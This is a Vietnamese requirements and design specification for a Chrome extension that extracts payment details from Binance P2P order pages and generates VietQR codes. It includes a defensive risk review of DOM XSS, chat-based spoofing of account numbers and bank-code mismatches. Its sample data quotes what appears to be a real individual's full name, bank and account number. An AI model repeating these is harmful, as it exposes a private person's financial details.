# Tài Liệu Đặc Tả Thực Thi: Tiện Ích Tạo Nhanh Mã Thanh Toán VietQR (`bank-qr-extension`)

- **Mã Dự Án**: `BANK-QR-EXTENSION-004`
- **Phân Nhóm**: Nhóm 4 — Trading, Market Intelligence & Utility Extensions
- **Đội Ngũ Phụ Trách**: Squad 4 — BA Team (`intake`, `ba`, `requirement_challenger`) & PM Team (`orchestrator`, `estimator_cost_controller`) + QA/Test (`test_engineer`, `qa_reviewer`)
- **Trạng Thái Tài Liệu**: `READY FOR EXECUTION` (Đã qua cổng kiểm duyệt độc lập)
- **Nguồn Đối Chiếu Thực Tế**:
  - [manifest.json](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/manifest.json)
  - [background.js](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/background.js)
  - [content.js](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/content.js)
  - [index.html](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/index.html)

---

## PHẦN 1 — INTAKE & PHÂN LOẠI (`intake`)

### 1.1. Bảng Phân Tách Thông Tin (Stated Facts vs. Explicit Assumptions)

| Mã | Phân Loại | Nội Dung Chi Tiết | Nguồn Trích Dẫn (File / Dòng) |
| :--- | :--- | :--- | :--- |
| `FACT-01` | **Stated Fact** | Dự án là một Chrome Extension Manifest V3 tên `"Bank QR Shortcut"` (`version: 1.0`), sử dụng quyền `activeTab` và `scripting`, kích hoạt bằng phím tắt `Ctrl+Shift+Q` (`command: "generate-qr"`). | [manifest.json](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/manifest.json#L1-L20), [background.js](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/background.js#L1-L10) |
| `FACT-02` | **Stated Fact** | Giao diện mục tiêu mà extension quét DOM (lưu mẫu trong `index.html`) là màn hình chi tiết lệnh giao dịch P2P (cấu trúc CSS `bn-flex`, `text-textBuy`, `bn-tooltips-wrap` của sàn Binance P2P) với các trường: `"Bạn thanh toán"` (`₫ 220,000.00`), `"Nội dung chuyển khoản"` (`22862005097425145856`), `"Họ và tên"` (`NGUYEN ÐUC SON`), `"Tên ngân hàng"` (`MB`), `"Số tài khoản/Số thẻ"` (`000515858888`), và `"Nội dung chuyển khoản đề xuất"`. | [index.html](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/index.html#L1-L211) |
| `FACT-03` | **Stated Fact** | Hàm `getValueByLabel(searches, strictMatch)` trong `content.js` quét toàn bộ `document.querySelectorAll("*")`, tìm phần tử chứa nhãn bên trái rồi leo ngược lên tối đa 5 tầng `parentElement` để lấy `row.children[row.children.length - 1].innerText` ở bên phải. | [content.js](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/content.js#L6-L50) |
| `FACT-04` | **Stated Fact** | Quy tắc làm sạch số tiền hiện tại: xóa `₫`, `$`, `VND`, khoảng trắng; nếu kết thúc bằng `.\d{1,2}` hoặc `,\d{1,2}` thì cắt bỏ phần thập phân (`.00`), sau đó giữ lại các chữ số. | [content.js](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/content.js#L54-L67) |
| `FACT-05` | **Stated Fact** | Extension ánh xạ tên ngân hàng sang mã VietQR thông qua từ điển `BANK_MAP` (hơn 40 ngân hàng Việt Nam), kiểm tra bắt buộc phải có `accountNo` và `amount`, sau đó tạo ảnh QR qua URL `https://img.vietqr.io/image/${bankName}-${accountNo}-print.png?amount=${amount}&addInfo=...&accountName=...` và chèn một modal `overlay` vào `document.body`. | [content.js](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/content.js#L89-L205) |
| `FACT-06` | **Stated Fact** | Trong `content.js` hiện tại tồn tại các lỗ hổng kỹ thuật nghiêm trọng: (1) Dùng `overlay.innerHTML` chèn trực tiếp chuỗi `accountName`, `bankName`, `accountNo`, `addInfo` lấy từ DOM trang web mà không escape HTML (lỗ hổng **DOM XSS**); (2) Nhấn `Ctrl+Shift+Q` nhiều lần sẽ chồng nhiều lớp `overlay` lên nhau; (3) `toBankCode()` dùng `key.includes(k) || k.includes(key)` rất dễ khớp nhầm (ví dụ `"mb"` khớp nhầm với `"cimb"` hoặc `"eximbank"` nếu thứ tự duyệt thay đổi). | [content.js](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/content.js#L133-L199) |
| `ASSUMP-01` | **Explicit Assumption** | Đây là công cụ hỗ trợ thanh toán tiền thật qua ngân hàng (đặc biệt là giao dịch P2P giá trị lớn), nên **độ chính xác tuyệt đối của Số tài khoản, Ngân hàng, Số tiền, Nội dung chuyển khoản** và **chống giả mạo thông tin thanh toán (Anti-Tampering / Anti-Hidden-DOM Spoofing)** là yêu cầu sống còn số 1 (`P0`). | Suy luận từ nghiệp vụ thanh toán VietQR và Phần 3 |
| `ASSUMP-02` | **Explicit Assumption** | Người dùng ngoài việc bấm phím tắt `Ctrl+Shift+Q` còn muốn click trực tiếp vào biểu tượng Extension trên thanh công cụ trình duyệt (`chrome.action.onClicked`) và bấm phím `Escape` để đóng nhanh modal QR. | Suy luận từ chuẩn UX của Chrome Extension |

### 1.2. Câu Hỏi Làm Rõ (Clarification Questions)

| Mã Câu Hỏi | Vấn Đề Cần Làm Rõ | Các Phương Án Lựa Chọn (Options) | Khuyến Nghị Của BA Team |
| :--- | :--- | :--- | :--- |
| `CLAR-01` | **Phạm vi trang web cho phép kích hoạt & Chống giả mạo (Host Whitelist)**: Để tránh bấm nhầm trên trang lừa đảo hoặc bị chèn DOM ẩn trong khung chat P2P, nên giới hạn phạm vi quét thế nào? | - **Option A (Scoped Container + Host Whitelist Warning - Khuyến nghị)**: Ưu tiên quét trong vùng thông tin lệnh thanh toán chính (loại trừ hoàn toàn vùng khung chat `chat-box` của đối tác P2P và các phần tử ẩn `display: none` / `opacity: 0`), đồng thời hiển thị cảnh báo màu cam nếu tên miền hiện tại không nằm trong `trusted_domains` của `settings.json`.<br>- **Option B**: Quét mọi phần tử trên mọi trang web không phân biệt vùng chat.<br>- **Option C**: Chỉ cho phép chạy cứng trên duy nhất 1 URL cố định. | **Khuyến nghị: Option A** — Chặn đứng kịch bản kẻ gian P2P nhắn tin giả mạo `"Số tài khoản: 99999999"` vào ô chat để đánh lừa thuật toán `querySelectorAll("*")` của extension! |
| `CLAR-02` | **Xử lý khi không nhận diện được Mã Ngân Hàng chuẩn Napas/VietQR**: Hiện tại nếu `toBankCode()` không tìm thấy trong `BANK_MAP`, code lấy nguyên chuỗi `displayName.replace(/\s+/g, "")` đưa vào URL VietQR khiến ảnh QR bị lỗi. | - **Option A**: Chỉ cho phép sinh mã QR khi khớp chính xác với danh mục mã ngân hàng hợp lệ trong `BANK_MAP`; nếu không khớp thì chuyển sang trạng thái Error rõ ràng kèm danh sách gợi ý hoặc cho phép chọn lại ngân hàng trên Modal.<br>- **Option B**: Giữ nguyên cách ghép chuỗi tự do.<br>- **Option C**: Mặc định gán về VCB nếu không tìm thấy. | **Khuyến nghị: Option A** — Tuyệt đối không đoán mò mã ngân hàng trong giao dịch chuyển tiền. |
| `CLAR-03` | **Kiểm tra chéo Số tiền (`Amount Sanity Check`)**: Khi số tiền trích xuất có định dạng lạ (ví dụ ngoại tệ `$ 100.00` thay vì `₫` hoặc vượt ngưỡng cảnh báo `> 500,000,000 VND`), hệ thống xử lý ra sao? | - **Option A**: Chặn tạo QR nếu đơn vị tiền tệ trên trang là ngoại tệ (`$`, `USDT`, `EUR`) không phải `VND`/`₫`, và hiện hộp thoại xác nhận nổi bật khi số tiền `>= high_value_warning_vnd` (mặc định `50,000,000 VND`).<br>- **Option B**: Xóa ký hiệu `$` và coi `$100` là `100 VND` như code hiện tại.<br>- **Option C**: Bỏ qua số tiền, để người dùng tự nhập trên điện thoại. | **Khuyến nghị: Option A** — Sửa ngay lỗi nghiêm trọng ở dòng 58 [content.js](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/content.js#L58) đang xóa ký tự `$` và biến `$1,000` thành `1000 VND`. |

---

## PHẦN 2 — ĐẶC TẢ NGHIỆP VỤ, CẤU TRÚC DỮ LIỆU & UX 5 TRẠNG THÁI (`ba`)

### 2.1. Bảng Yêu Cầu Nghiệp Vụ & Truy Vết (Requirements Traceability Matrix)

| Mã Yêu Cầu | Mô Tả Yêu Cầu Nghiệp Vụ | Nguồn Gốc | Ưu Tiên (MoSCoW) |
| :--- | :--- | :--- | :--- |
| `REQ-001` | **Kích hoạt Tiện ích Đa kênh (`Shortcut & Action Icon`)**: Hỗ trợ kích hoạt tạo mã QR qua cả phím tắt `Ctrl+Shift+Q` (`chrome.commands`) và khi click vào icon extension trên thanh công cụ (`chrome.action.onClicked`). | `FACT-01`, `ASSUMP-02` | `P0 (Must)` |
| `REQ-002` | **Quét DOM An toàn & Loại trừ Vùng Không Tin cậy (`Safe Visible DOM Extraction`)**: Chỉ quét các phần tử đang hiển thị thực tế trên màn hình (`checkVisibility` / `getBoundingClientRect().width > 0`), loại trừ hoàn toàn các khung chat (`[class*="chat"]`, `iframe`, `script`, `style`, `[aria-hidden="true"]`) để chống tấn công chèn nhãn giả. | `FACT-03`, `CLAR-01`, Phần 3 (`RISK-01`) | `P0 (Must)` |
| `REQ-003` | **Trích xuất & Kiểm tra Đơn vị Số tiền (`Strict VND Amount Parser`)**: Nhận diện và bóc tách số tiền từ các nhãn cấu hình; từ chối tạo QR nếu phát hiện ký hiệu ngoại tệ (`$`, `USD`, `USDT`, `EUR`) mà không có `₫`/`VND`; xử lý chính xác dấu phân cách hàng nghìn và phần thập phân `.00` / `,00`. | `FACT-04`, `CLAR-03`, Phần 3 (`RISK-03`) | `P0 (Must)` |
| `REQ-004` | **Ánh xạ Chính xác Mã Ngân hàng VietQR (`Deterministic Bank Resolver`)**: Chuẩn hóa tên ngân hàng (bỏ dấu tiếng Việt khi cần, so khớp từ khóa dài trước từ khóa ngắn hoặc khớp ranh giới từ `\b`) để không bao giờ khớp nhầm giữa `"MB"`, `"CIMB"`, `"AMB"`, `"EXIMBANK"`; trả về lỗi nếu ngân hàng không thuộc danh mục hỗ trợ. | `FACT-05`, `FACT-06`, `CLAR-02` | `P0 (Must)` |
| `REQ-005` | **Trích xuất Số tài khoản, Tên chủ TK & Nội dung chuyển khoản**: Lọc sạch các ký tự rác/icon copy cạnh văn bản, chuẩn hóa số tài khoản (chỉ gồm chữ số/chữ cái hợp lệ độ dài `6..25` ký tự), và ưu tiên khớp tuyệt đối (`strictMatch = true`) cho nhãn `"Nội dung chuyển khoản"` để không lấy nhầm dòng `"Nội dung chuyển khoản đề xuất"`. | `FACT-02`, [content.js](file:///d:/Workspace/personal-tools/idea/bank-qr-extension/content.js#L81-L86) | `P0 (Must)` |
| `REQ-006` | **Hiển thị Modal VietQR Chống XSS & Chống Trùng Lặp (`Idempotent Safe Overlay`)**: Nếu modal `#bank-qr-extension-overlay` đã tồn tại thì xóa bản cũ trước khi mở bản mới; dựng giao diện hoàn toàn bằng DOM API (`createElement`, `textContent`) thay vì `innerHTML` để triệt tiêu 100% lỗ hổng DOM XSS; hỗ trợ đóng bằng phím `Esc` hoặc click ra ngoài. | `FACT-05`, `FACT-06`, Phần 3 (`RISK-04`) | `P0 (Must)` |
| `REQ-007` | **Đối chiếu Trực quan Chống Giả mạo (`Visual Verification Guard`)**: Trên Modal QR, hiển thị nổi bật **5 trường dữ liệu gốc** vừa trích xuất kèm nút **"Highlight trên trang gốc"** (tô viền xanh các ô DOM được lấy dữ liệu trên trang web) và cảnh báo đặc biệt nếu số tiền `>= 50,000,000 VND`. | `CLAR-01`, `CLAR-03`, Phần 3 (`RISK-01`) | `P1 (Should)` |
| `REQ-008` | **Cấu hình Tập trung trong `settings.json`**: Tách toàn bộ danh sách nhãn tìm kiếm (`label_keywords`), `bank_map`, `excluded_selectors`, `vietqr_template` và ngưỡng cảnh báo số tiền vào `settings.json` (được nạp qua `SettingsLoaderServiceHelper`). | Rule 4 & No Magic Strings | `P0 (Must)` |
| `REQ-009` | **Sao chép Nhanh Từng Trường (One-Click Copy Fallback)**: Khi ảnh VietQR không tải được do mất mạng hoặc người dùng dùng web banking trên máy tính, cung cấp nút Copy nhanh bên cạnh Số tài khoản, Số tiền và Nội dung chuyển khoản ngay trên Modal. | UX Enhancement | `P2 (Could)` |
| `REQ-010` | **Kiểm tra Tính toàn vẹn URL VietQR (`HTTPS & Parameter Validation`)**: Chỉ tạo URL tới đúng origin `https://img.vietqr.io/image/`, mã hóa `encodeURIComponent` cho `addInfo` và `accountName`, kiểm tra sự kiện `onload` / `onerror` của thẻ `<img>`. | `FACT-05` | `P1 (Should)` |

---

### 2.2. Data Structures, Constants & `settings.json` Schema

#### A. Định Nghĩa Types / Interfaces

```typescript
export enum ExtractionErrorCode {
  MISSING_ACCOUNT_NO = "MISSING_ACCOUNT_NO",
  MISSING_AMOUNT = "MISSING_AMOUNT",
  UNSUPPORTED_CURRENCY = "UNSUPPORTED_CURRENCY",
  UNKNOWN_BANK_NAME = "UNKNOWN_BANK_NAME",
  INVALID_ACCOUNT_FORMAT = "INVALID_ACCOUNT_FORMAT",
}

export interface LabelKeywordsConfig {
  amount: string[];
  accountNo: string[];
  accountName: string[];
  bankName: string[];
  addInfoStrict: string[];
  addInfoFallback: string[];
}

export interface SecurityAndValidationSettings {
  excluded_container_selectors: string[];
  trusted_domains: string[];
  min_amount_vnd: number;
  max_amount_vnd: number;
  high_value_warning_vnd: number;
  account_no_regex: string;
  max_parent_traversal_depth: number;
}

export interface VietQrProviderSettings {
  base_image_url: string;
  template: "print" | "compact" | "compact2" | "qr_only";
  image_load_timeout_ms: number;
}

export interface BankQrSettings {
  vietqr: VietQrProviderSettings;
  labels: LabelKeywordsConfig;
  security: SecurityAndValidationSettings;
  bank_map: Record<string, string>;
}

export interface ExtractedPaymentData {
  rawAmountText: string;
  amountVnd: string;
  rawAccountNoText: string;
  accountNo: string;
  accountName: string;
  rawBankText: string;
  bankDisplayName: string;
  bankCode: string | null;
  addInfo: string;
  isHighValueWarning: boolean;
  isUntrustedDomain: boolean;
}

export interface ValidationOutcome {
  isValid: boolean;
  errors: Array<{
    code: ExtractionErrorCode;
    message: string;
  }>;
  data: ExtractedPaymentData;
}
```

#### B. Bảng `CONSTANTS` & `ENUMS` (No Magic Numbers / No Hardcoded Strings)

| Tên Hằng Số (`CONSTANT_NAME`) | Giá Trị Mặc Định | Kiểu Dữ Liệu | Ý Nghĩa & Nơi Sử Dụng |
| :--- | :--- | :--- | :--- |
| `OVERLAY_DOM_ID` | `"bank-qr-extension-overlay"` | `string` | ID duy nhất của Modal QR để chống tạo chồng nhiều lớp khi bấm phím tắt liên tục. |
| `HIGHLIGHT_ATTRIBUTE_NAME` | `"data-bank-qr-source"` | `string` | Thuộc tính đánh dấu phần tử DOM gốc nơi trích xuất dữ liệu để người dùng đối chiếu trực quan. |
| `DEFAULT_MAX_PARENT_DEPTH` | `5` | `number` | Số tầng DOM cha tối đa leo ngược lên để tìm cặp Label - Value. |
| `MIN_VALID_AMOUNT_VND` | `1000` | `number` | Số tiền chuyển khoản tối thiểu hợp lệ tại Việt Nam (`1,000 VND`). |
| `HIGH_VALUE_WARNING_VND` | `50000000` | `number` | Ngưỡng cảnh báo giao dịch giá trị lớn (`50,000,000 VND`). |
| `MAX_VALID_AMOUNT_VND` | `5000000000` | `number` | Trần giới hạn chuyển khoản nhanh Napas247 (`5,000,000,000 VND`). |
| `VIETQR_BASE_URL` | `"https://img.vietqr.io/image"` | `string` | Endpoint chính thức tạo ảnh mã VietQR. |

#### C. Schema Chuẩn Của `settings.json`

```json
{
  "vietqr": {
    "base_image_url": "https://img.vietqr.io/image",
    "template": "print",
    "image_load_timeout_ms": 8000
  },
  "labels": {
    "amount": ["mua tổng số lượng", "bạn thanh toán", "số tiền", "amount"],
    "accountNo": ["số tài khoản/số thẻ", "số tài khoản", "account number", "accountno"],
    "accountName": ["họ và tên", "tên người nhận", "chủ tài khoản", "account name"],
    "bankName": ["tên ngân hàng", "ngân hàng", "bank name"],
    "addInfoStrict": ["nội dung chuyển khoản"],
    "addInfoFallback": ["nội dung chuyển khoản", "nội dung", "transfer content", "remarks"]
  },
  "security": {
    "excluded_container_selectors": [
      "[class*='chat']",
      "[id*='chat']",
      "iframe",
      "script",
      "style",
      "noscript",
      "[aria-hidden='true']"
    ],
    "trusted_domains": [
      "p2p.binance.com",
      "www.binance.com",
      "remitano.com",
      "okx.com",
      "bybit.com"
    ],
    "min_amount_vnd": 1000,
    "high_value_warning_vnd": 50000000,
    "max_amount_vnd": 5000000000,
    "account_no_regex": "^[0-9A-Za-z]{6,25}$",
    "max_parent_traversal_depth": 5
  },
  "bank_map": {
    "vietinbank": "ICB", "icb": "ICB", "công thương": "ICB",
    "vietcombank": "VCB", "vcb": "VCB", "ngoại thương": "VCB",
    "bidv": "BIDV", "đầu tư và phát triển": "BIDV",
    "agribank": "VBA", "vba": "VBA", "nông nghiệp": "VBA",
    "ocb": "OCB", "phương đông": "OCB",
    "mb bank": "MB", "mbbank": "MB", "mb": "MB", "quân đội": "MB",
    "techcombank": "TCB", "tcb": "TCB", "kỹ thương": "TCB",
    "acb": "ACB", "á châu": "ACB",
    "vpbank": "VPB", "vpb": "VPB", "việt nam thịnh vượng": "VPB",
    "tpbank": "TPB", "tpb": "TPB", "tiên phong": "TPB",
    "sacombank": "STB", "stb": "STB", "sài gòn thương tín": "STB",
    "hdbank": "HDB", "hdb": "HDB", "phát triển tp hcm": "HDB",
    "vietcapitalbank": "VCCB", "vccb": "VCCB", "bản việt": "VCCB",
    "scb": "SCB", "sài gòn": "SCB",
    "vib": "VIB", "quốc tế việt nam": "VIB",
    "shb": "SHB", "sài gòn - hà nội": "SHB", "sài gòn hà nội": "SHB",
    "eximbank": "EIB", "eib": "EIB", "xuất nhập khẩu": "EIB",
    "msb": "MSB", "hàng hải": "MSB",
    "cake": "CAKE", "ubank": "Ubank", "timo": "TIMO",
    "viettelmoney": "VTLMONEY", "viettel money": "VTLMONEY",
    "vnptmoney": "VNPTMONEY", "vnpt money": "VNPTMONEY",
    "saigonbank": "SGICB", "sài gòn công thương": "SGICB",
    "bac a bank": "BAB", "bacabank": "BAB", "bab": "BAB", "bắc á": "BAB",
    "momo": "momo", "pvcombank pay": "PVDB", "pvdb": "PVDB",
    "pvcombank": "PVCB", "pvcb": "PVCB", "đại chúng": "PVCB",
    "mbv": "MBV", "việt nam hiện đại": "MBV", "ncb": "NCB", "quốc dân": "NCB",
    "shinhanbank": "SHBVN", "shinhan": "SHBVN", "shbvn": "SHBVN",
    "abbank": "ABB", "abb": "ABB", "an bình": "ABB",
    "vietabank": "VAB", "vab": "VAB", "việt á": "VAB",
    "namabank": "NAB", "nam a bank": "NAB", "nab": "NAB", "nam á": "NAB",
    "pgbank": "PGB", "pgb": "PGB", "vietbank": "VIETBANK", "việt nam thương tín": "VIETBANK",
    "baovietbank": "BVB", "bvb": "BVB", "bảo việt": "BVB",
    "seabank": "SEAB", "seab": "SEAB", "đông nam á": "SEAB",
    "coopbank": "COOPBANK", "hợp tác xã": "COOPBANK",
    "lpbank": "LPB", "lpb": "LPB", "lienvietpostbank": "LPB", "lộc phát": "LPB", "bưu điện liên việt": "LPB",
    "kienlongbank": "KLB", "klb": "KLB", "kiên long": "KLB",
    "kbank": "KBank", "kasikornbank": "KBank",
    "hongleong": "HLBVN", "hlbvn": "HLBVN", "hong leong": "HLBVN",
    "woori": "WVN", "wvn": "WVN", "hsbc": "HSBC", "cimb": "CIMB",
    "standardchartered": "SCVN", "scvn": "SCVN", "standard chartered": "SCVN",
    "publicbank": "PBVN", "pbvn": "PBVN", "public": "PBVN"
  }
}
```

---

### 2.3. Kiến Trúc Service & Helper (Rule 4 & Single Responsibility Principle)

| Tên File Module | Phân Loại | Hàm Thành Phần & Chữ Ký (Signature) | Docstring Mục Đích (1 Việc Duy Nhất - SRP) |
| :--- | :--- | :--- | :--- |
| `src/helpers/settingsLoaderServiceHelper.js` | `*ServiceHelper` | `getExtensionSettings() -> BankQrSettings` | Cung cấp cấu hình chuẩn từ `settings.json` (và `chrome.storage.local` override nếu có). |
| `src/helpers/domExtractorServiceHelper.js` | `*ServiceHelper` | `isElementSafeAndVisible(el, excludedSelectors) -> boolean` | Kiểm tra phần tử không nằm trong vùng bị cấm (khung chat, iframe) và đang hiển thị thực tế trên màn hình. |
| `src/helpers/domExtractorServiceHelper.js` | `*ServiceHelper` | `findValueByLabelInDom(rootDoc, searches, strictMatch, securityConfig) -> { text: string, sourceElement: Element \| null }` | Tìm nhãn bên trái và leo ngược lên tối đa `max_parent_traversal_depth` tầng để lấy giá trị bên phải kèm tham chiếu phần tử DOM gốc. |
| `src/helpers/paymentParserServiceHelper.js` | `*ServiceHelper` | `parseStrictVndAmount(rawAmountText) -> { amountDigits: string, hasForeignCurrencyError: boolean }` | Bóc tách số tiền VND chính xác, chặn ngay nếu phát hiện ký hiệu ngoại tệ (`$`, `USD`, `USDT`) không phải VND. |
| `src/helpers/paymentParserServiceHelper.js` | `*ServiceHelper` | `resolveBankCodeDeterministically(rawBankDisplayName, bankMap) -> string \| null` | Ánh xạ tên ngân hàng sang mã VietQR theo thứ tự ưu tiên: khớp chính xác 100% -> khớp từ khóa dài nhất có ranh giới từ (`\b`), trả về `null` nếu không khớp. |
| `src/helpers/paymentParserServiceHelper.js` | `*ServiceHelper` | `buildVietQrImageUrl(vietqrConfig, bankCode, accountNo, amountVnd, addInfo, accountName) -> string` | Tạo URL ảnh VietQR đã mã hóa `encodeURIComponent` an toàn cho mọi tham số truy vấn. |
| `src/services/paymentExtractionService.js` | `*Service` | `extractAndValidatePaymentInfo(rootDoc, currentHostname, settings) -> ValidationOutcome` | Điều phối quá trình trích xuất 5 trường từ DOM, tô viền đánh dấu các phần tử nguồn và kiểm tra toàn bộ điều kiện hợp lệ. |
| `src/services/qrOverlayUiService.js` | `*Service` | `renderSafeQrOverlayModal(rootDoc, validationOutcome, settings) -> HTMLElement` | Xóa overlay cũ (nếu có), dựng Modal VietQR hoàn toàn bằng DOM API an toàn (`createElement` + `textContent`), gắn sự kiện đóng bằng `Esc`/click ngoài và nút Copy. |

---

### 2.4. Ma Trận 5 Trạng Thái UX (Modal Overlay Trên Trình Duyệt)

| Trạng Thái UX | Hành Vi Hiển Thị & Trải Nghiệm Người Dùng |
| :--- | :--- |
| **1. Ideal (Đầy đủ 5 trường & Ảnh QR tải thành công)** | Hiển thị Modal sắc nét ở chính giữa màn hình (đồng thời tô viền xanh nét đứt xung quanh các dòng Số tiền, Số TK, Ngân hàng trên trang gốc để người dùng liếc mắt đối chiếu): Ảnh VietQR rõ nét, đầy đủ 5 dòng thông tin (`👤 Tên`, `🏦 Ngân hàng`, `🔢 Số TK`, `💰 Số tiền`, `📝 Nội dung`) kèm nút Copy từng dòng. Bấm `Esc` hoặc click ra vùng tối đóng ngay. |
| **2. Loading (Đang tải ảnh QR từ `img.vietqr.io`)** | Trong khi ảnh từ `https://img.vietqr.io` đang tải về, khung ảnh hiển thị vòng xoay Skeleton `"⏳ Đang tạo mã VietQR từ Napas..."`, trong khi bảng 5 thông tin chữ bên dưới hiển thị ngay lập tức không phải chờ. |
| **3. Empty (Trang hiện tại không có thông tin thanh toán)** | Khi người dùng bấm `Ctrl+Shift+Q` trên một trang không có thông tin ngân hàng (cả `accountNo` và `amount` đều rỗng), hiển thị Toast/Modal nhỏ gọn: `"ℹ️ Không tìm thấy thông tin chuyển khoản trên trang này. Hãy mở chi tiết lệnh thanh toán trước khi nhấn Ctrl+Shift+Q"` (thay vì `alert()` thô bạo làm treo luồng trình duyệt). |
| **4. Error (Thiếu trường bắt buộc / Ngoại tệ / Không nhận diện được Ngân hàng / Lỗi tải ảnh QR)** | - Nếu thiếu `Số tài khoản`, `Số tiền`, hoặc `Tên ngân hàng` không nằm trong danh sách VietQR, hoặc đơn vị tiền là `$`/`USDT`: hiển thị Modal Báo Lỗi màu đỏ chỉ rõ trường nào bị lỗi (`❌ Không nhận diện được mã ngân hàng: "ABCXYZ" — Đã chặn tạo QR để tránh chuyển nhầm`).<br>- Nếu mất mạng không tải được ảnh từ `img.vietqr.io`: ẩn thẻ `<img>`, hiện thông báo lỗi mạng và giữ nguyên các nút Copy nhanh Số TK / Số tiền / Nội dung. |
| **5. Partial / Overflow (Thiếu Tên người nhận / Giao dịch >= 50 triệu VND / Bấm phím tắt liên tục)** | - Nếu thiếu `Họ và tên` hoặc `Nội dung chuyển khoản`: vẫn tạo QR nhưng hiện nhãn cảnh báo màu cam `"⚠️ Chưa trích xuất được Nội dung chuyển khoản — Vui lòng kiểm tra kỹ trên web!"`.<br>- Nếu `Số tiền >= 50,000,000 VND`: hiện dải băng cảnh báo đỏ `"🚨 GIAO DỊCH GIÁ TRỊ LỚN (50,000,000+ VNĐ): Bắt buộc đối chiếu từng chữ số Số TK trên màn hình gốc!"`.<br>- Nếu bấm `Ctrl+Shift+Q` 5 lần liên tiếp: chỉ làm mới duy nhất 1 Modal (`#bank-qr-extension-overlay`), không bao giờ xếp chồng nhiều lớp. |

---

## PHẦN 3 — PHẢN BIỆN ĐỘC LẬP & CHỐT CHẶN KỸ THUẬT (`requirement_challenger`)

| Mã Rủi Ro | Mô Tả Lỗ Hổng / Rủi Ro Thực Tế | Tác Động Nếu Không Chặn | Quy Tắc Khóa Chặn Kỹ Thuật (Mandatory Guardrail) |
| :--- | :--- | :--- | :--- |
| `RISK-01` | **Giả mạo Mã QR Thanh toán qua Khung Chat P2P hoặc Phần tử DOM Ẩn (`DOM Spoofing / Payment Hijacking`)**: Hàm `getValueByLabel()` trong `content.js` hiện tại quét toàn bộ `document.querySelectorAll("*")` theo thứ tự xuất hiện trong DOM và không kiểm tra vùng chứa hay độ hiển thị. Trong giao dịch P2P, kẻ lừa đảo có thể nhắn vào khung chat một cấu trúc HTML/text chứa chữ `"Số tài khoản/Số thẻ: 999988887777"`, hoặc một extension/quảng cáo khác chèn phần tử ẩn (`display:none`). Nếu phần tử đó nằm trước trong cây DOM, extension sẽ tạo mã QR chuyển tiền thẳng vào tài khoản của kẻ lừa đảo! | **Mất tiền thật trực tiếp** của người dùng vào tay kẻ gian P2P. | **Chốt chặn 3 lớp trong `domExtractorServiceHelper.js`**:<br>1. Loại trừ tuyệt đối mọi phần tử nằm trong `excluded_container_selectors` (`[class*="chat"]`, `[id*="chat"]`, `iframe`, `[aria-hidden="true"]`).<br>2. Bắt buộc kiểm tra phần tử đang hiển thị thực tế (`getComputedStyle(el).display !== "none"`, `visibility !== "hidden"`, `opacity !== "0"`, `getBoundingClientRect().width > 0`).<br>3. Tô viền xanh nổi bật (`outline: 2px dashed #00C853`) trực tiếp lên phần tử DOM mà extension đã lấy dữ liệu trên trang web để người dùng nhìn thấy ngay dữ liệu lấy từ bảng lệnh chính hay từ khung chat. |
| `RISK-02` | **Khớp nhầm Mã Ngân Hàng do thuật toán `includes` hai chiều (`Bank Code Collision`)**: Trong `content.js` (dòng 137): `if (key.includes(k) || k.includes(key)) return v;`. Vì kiểm tra cả `k.includes(key)`, nếu tên ngân hàng trên web là `"Bản Việt"` hoặc chuỗi ngắn `"b"`, hoặc `"mb"` so với `"cimb"` / `"eximbank"` / `"kbank"`, nó có thể trả về sai ngân hàng thụ hưởng. | Chuyển tiền nhầm sang ngân hàng khác có cùng số tài khoản trùng hợp, hoặc mã QR báo lỗi không thanh toán được. | **Chốt chặn trong `paymentParserServiceHelper.js`**:<br>1. Bỏ hoàn toàn vế ngược `k.includes(key)`.<br>2. So khớp chính xác 100% (`BANK_MAP[key]`) trước; nếu tìm chuỗi con thì sắp xếp các khóa trong `BANK_MAP` theo **độ dài giảm dần** (khớp `"lienvietpostbank"` / `"mb bank"` trước `"mb"`) và bắt buộc kiểm tra ranh giới từ (word boundary) để `"mb"` không bao giờ khớp vào giữa chữ `"cimb"` hay `"eximbank"`. |
| `RISK-03` | **Làm sai lệch Số tiền do xóa ký hiệu `$` và cắt nhầm dấu chấm/phẩy (`Currency & Decimal Truncation Bug`)**: Dòng 58 của `content.js`: `rawAmount.replace(/[₫$\s]/g, "")`. Nếu người dùng đang mở tab P2P bằng `USD` (`$ 250.00`) hoặc số tiền định dạng kiểu Việt Nam `1.200.050` (nếu vô tình có 2 số cuối sau dấu chấm trong trường hợp biên), thuật toán có thể biến ngoại tệ thành VND hoặc cắt mất chữ số hàng đơn vị. | Tạo mã QR sai số tiền thanh toán, dẫn đến tranh chấp lệnh P2P hoặc chuyển thừa/thiếu tiền. | **Chốt chặn trong `parseStrictVndAmount()`**:<br>1. Nếu chuỗi gốc chứa `$`, `USD`, `USDT`, `EUR`, `GBP` mà không chứa `₫` hoặc `VND`, **lập tức chặn và báo lỗi `UNSUPPORTED_CURRENCY`**.<br>2. Chỉ cắt phần thập phân `.00` hoặc `,00` ở cuối khi toàn bộ chuỗi phía trước sử dụng dấu phân cách ngược lại (ví dụ `220,000.00` dùng dấu phẩy phân tách nghìn và `.00` thập phân, hoặc `220.000,00`). |
